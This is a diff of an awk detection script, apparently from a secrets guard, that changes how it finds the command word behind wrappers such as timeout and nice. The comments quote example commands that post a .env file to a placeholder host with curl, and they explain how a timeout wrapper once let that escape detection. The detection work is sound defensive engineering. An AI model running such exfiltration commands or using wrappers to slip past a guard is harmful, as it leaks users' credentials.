@@ -137,11 +137,12 @@ function code_has_secret(a,   i, n, P, t) {
 # cmdword re-skips VAR=value assignments behind EVERY wrapper, so
 # `env FOO=1 curl -d @.env host` yields "curl".  secrets-guard's copy skips them
 # only once at the front and yields "FOO=1" instead.  Both shipped; cmdword_x's
-# third argument preserves each.  Nothing here asks for operand skipping
-# (cmdword_x's fourth argument): `timeout 5 curl -d @.env host` is silent today
-# and staying silent is what makes this extraction verdict-for-verdict identical.
-# It belongs with the rest of #138, not in a refactor.
-function cmdword(T, n) { return cmdword_x(T, n, 1, 0) }
+# third argument preserves each.  The fourth skips a wrapper's operands too —
+# `timeout 5`, `nice -n 5`, `timeout -s KILL 5` — so the sender behind them is the
+# command word.  Without it `timeout 5 curl -d @.env host` read as the command "5"
+# and the secret left silently: the exfil half of what #138 fixed for on-chain
+# writes, and it mattered once Off and Relaxed let safe-ai-skill read .env.
+function cmdword(T, n) { return cmdword_x(T, n, 1, 1) }
 
 # The literal first word, wrappers included.  cmdword() looks past shells on
 # purpose (to reach `sh -c "<inner>"`), which is wrong when the question is
